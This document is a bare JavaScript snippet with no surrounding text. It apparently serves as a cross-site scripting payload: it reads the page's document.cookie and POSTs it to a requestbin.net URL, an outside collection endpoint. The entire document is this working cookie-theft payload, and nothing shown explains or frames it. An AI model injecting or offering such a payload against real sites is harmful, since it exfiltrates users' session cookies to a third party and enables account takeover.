fetch('https://requestbin.net/123456789', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'cookie=' + encodeURIComponent(document.cookie)
});
